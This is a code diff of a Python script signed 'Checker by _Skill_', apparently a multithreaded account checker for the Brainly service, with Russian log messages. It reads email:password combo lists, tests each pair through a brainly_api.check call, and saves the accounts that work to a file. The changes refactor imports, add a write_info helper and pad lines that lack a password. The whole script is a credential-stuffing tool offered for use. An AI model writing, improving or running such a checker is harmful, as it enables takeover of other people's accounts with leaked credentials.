@@ -1,8 +1,4 @@
-import brainly_api, time, os, requests
-import logging
-import argparse
-import datetime
-from multiprocessing.dummy import Pool
+import logging, brainly_api
 
 info = 'Checker by _Skill_'
 logging.basicConfig(level=logging.INFO)
@@ -10,6 +6,7 @@ logging.basicConfig(level=logging.INFO)
 
 class Checker(object):
     def __init__(self):
+        import datetime
         self.acc_array = []
         self.date = datetime.datetime.now().strftime("%d%m%Y-%H%M%S")
         try:
@@ -20,12 +17,21 @@ class Checker(object):
 
 
     def load(self, base_path):
-        file = open(base_path, 'r').readlines()
+        file = open(base_path, 'r', encoding='latin-1').readlines()
         file = [combos.rstrip() for combos in file]
         for lines in file:
-            data = lines.split(':')
+            data = lines.replace('\n', '').split(':')
+            try:
+                data[1] += ''
+            except IndexError:
+                data.append('1')
             self.acc_array.append({'em': data[0],
-                                    'pw': data[1]})
+                                   'pw': data[1]})
+
+    def write_info(self, info):
+        logging.info('Новый аккаунт')
+        self.filename.write(info)
+        self.filename.flush()
 
 
     def login(self, acc):
@@ -33,11 +39,11 @@ class Checker(object):
         password = acc['pw']
         result = brainly_api.check(email, password)
         if result != None:
-            logging.info('Новый аккаунт')
-            self.filename.write(result)
+            self.write_info(result)
 
 
     def main(self, threads):
+        from multiprocessing.dummy import Pool
         self.load(base_path)
         self.threads = threads
         pool = Pool(self.threads)
@@ -47,6 +53,7 @@ class Checker(object):
 
 
 if __name__ == '__main__':
+    import time, os
     logging.info(info)
     while True:
         try:
@@ -55,10 +62,10 @@ if __name__ == '__main__':
             base_path = os.path.abspath(r''.join(path)).replace('\\', '/')
             start = time.time()
             Checker().main(threads)
-            logging.info('Закончено за {} сек.\n--------------------'.format(round(time.time() - start, 2)))
+            logging.info('Закончено за {} сек.\n--------------------'.format(str(round(time.time() - start, 2))))
         except KeyboardInterrupt:
             logging.info('Остановлено')
-            input()
             os._exit(1)
         except:
             logging.error('Что-то пошло не так')
+
